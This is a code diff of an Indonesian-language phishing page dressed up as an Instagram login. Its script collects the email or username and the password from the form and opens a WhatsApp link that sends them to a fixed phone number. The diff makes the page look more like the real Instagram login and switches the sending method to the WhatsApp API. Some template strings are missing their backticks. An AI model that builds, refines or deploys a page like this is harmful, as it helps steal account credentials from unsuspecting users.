@@ -1,37 +1,37 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login Instagram</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="login-box">
-    <h2>Login Instagram</h2>
-    <form id="loginForm">
-      <label for="username">Username</label>
-      <input type="text" id="username" name="username" required>
-
-      <label for="password">Password</label>
-      <input type="password" id="password" name="password" required>
-
-      <input type="submit" value="Login">
-    </form>
+  <div class="login-container">
+    <div class="login-box">
+      <h1 class="logo">Instagram</h1>
+      <form id="loginForm">
+        <input type="email" id="email" placeholder="Email" required />
+        <input type="password" id="password" placeholder="Password" required />
+        <button type="submit">Login</button>
+      </form>
+      <p class="signup">Belum punya akun? <a href="#">Daftar</a></p>
+    </div>
   </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault(); // Mencegah submit form default
-      var username = document.getElementById("username").value;
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      var email = document.getElementById("email").value;
       var password = document.getElementById("password").value;
 
-      var noWa = "62856038910564"; // Nomor WhatsApp tujuan
+      // Nomor WhatsApp Anda (kode negara tanpa + atau 0 di depan)
+      var nomorWhatsApp = "62856038910564";
 
-      var pesan = Login Instagram:%0AUsername: ${username}%0APassword: ${password};
-      var url = "https://wa.me/" + noWa + "?text=" + pesan;
-
-      window.open(url, '_blank');
+      var pesan = Login Instagram\nEmail: ${email}\nPassword: ${password};
+      var url = https://api.whatsapp.com/send?phone=${nomorWhatsApp}&text=${encodeURIComponent(pesan)};
+      
+      window.open(url, "_blank");
     });
   </script>
 </body>
